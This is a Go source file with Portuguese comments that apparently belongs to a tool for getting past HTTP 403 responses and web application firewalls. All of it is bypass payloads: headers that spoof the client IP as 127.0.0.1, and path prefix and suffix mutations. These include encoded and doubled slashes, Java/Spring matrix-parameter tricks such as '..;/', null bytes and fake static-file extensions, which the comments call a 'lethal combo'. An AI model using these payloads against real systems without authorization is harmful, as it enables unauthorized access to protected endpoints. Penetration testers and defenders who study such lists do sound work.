package regras

import ()

var HeadersBypass = map[string]string{
	"X-Forwarded-For":           "127.0.0.1",
	"X-Forwarded-Host":          "127.0.0.1",
	"X-Client-IP":               "127.0.0.1",
	"X-Remote-IP":               "127.0.0.1",
	"X-Originating-IP":          "127.0.0.1",
	"X-Custom-IP-Authorization": "127.0.0.1",
	"True-Client-IP":            "127.0.0.1",
	"Cluster-Client-IP":         "127.0.0.1",
}

var SufixosBypass = []string{
	"", "/", "..;/", "/..;/", "%20", "%09", "%00", // Caracteres em branco e manipulação final
	".json", ".css", ".html", ".js", // Falsificação de recursos estáticos (Bypass de regras de WAF)
	";.json", ";.css", ";.html", // Matrix Parameter + Falsificação estática (Combo letal)
	"?", "??", "&", "#", // Fragmentação de query
}

var PrefixosBypass = []string{
	"/", "/*/", "//", "///", "/\\/", "/%5c/", // Mutações de barras (Slashes)
	"/%2e/", "/%252e/", "/%ef%bc%8f/", // Single Encode, Double Encode, Unicode Fullwidth
	"/;/;/../", "/.;/", "/..;/", "/...;/", // Abusos de Matrix Parameters (Java/Spring/Tomcat)
	"/%00/", // Null Byte Injection (Ignorado por muitos WAFs, quebra o parser)
}
